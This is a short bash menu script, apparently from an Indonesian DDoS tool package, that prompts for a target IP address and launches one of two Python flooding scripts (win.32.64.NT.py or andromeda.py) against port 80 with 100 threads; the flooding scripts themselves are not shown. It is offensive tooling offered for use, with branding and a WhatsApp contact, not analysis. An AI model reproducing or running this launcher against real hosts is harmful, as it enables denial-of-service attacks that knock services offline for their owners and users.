clear
blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'                                           
yellow='\033[33;1m'
sleep 1
echo $green"Welcome to All"
echo $blue"?WhatsApp:+6285816396186              "
echo $blue"?Message :INDONESIAN_DDOS.            "
echo $red"#######################################"
echo $green"                 Official"
echo $red"#######################################"
echo $white"[1].Trojan Ddos"
echo $red"......................"
echo $white"[2].Droid Ddos "
echo $red"......................"
echo $white"[0].EXIT"
echo $red"......................"
echo $red"PILIH MANA TOD..."
read -p "PIlih Brad:)" bro;
echo
if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
echo $yellow"Trojan DDOS"
    sleep 1
echo $red"Masukkan IP Target: 192.x.x.x"
read -p "===>" ipt
clear
echo
python win.32.64.NT.py -s$ipt -p80 -t100
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
echo $yellow"Droid DDOS"
    sleep 1
echo $red"Masukkan IP Target: 192.x.x.x"
read -p "===>" ipt
clear
echo
python andromeda.py -s$ipt -p80 -t100
fi
